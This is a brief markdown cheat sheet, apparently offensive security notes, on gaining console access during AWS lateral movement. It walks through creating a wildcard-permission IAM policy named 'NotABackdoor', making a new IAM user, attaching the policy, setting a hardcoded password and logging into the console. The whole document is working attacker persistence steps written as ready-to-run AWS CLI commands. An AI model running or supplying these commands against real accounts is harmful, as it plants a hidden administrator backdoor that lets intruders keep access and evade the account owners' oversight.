# Lateral movement
## Index
* [Gain GUI Acess](#Gain-GUI-Access)

## Gain GUI Access
#### Copy and save the following
- as ```admin-policy.json```
```
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "NotABackdoor",
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}
```

#### Create a new user that will give gui access to
- After gaining administrator
- Note down the ARN
```
sudo aws iam create-user --user-name gui-user --profile <profile name>
```

#### Attach the policy to the new user
```
sudo aws iam put-user-policy --user-name gui-user --policy-name VisualAid --policy-document file://admin-policy.json --profile <profile name>
```

#### Set password for the user
```
sudo aws iam create-login-profile --user-name gui-user --password "GUIAccessTime1" --profile <profile name>
```

#### Login with account ID
- Part from ARN
- ```https://<Account-ID-Number>.signin.aws.amazon.com/console/```
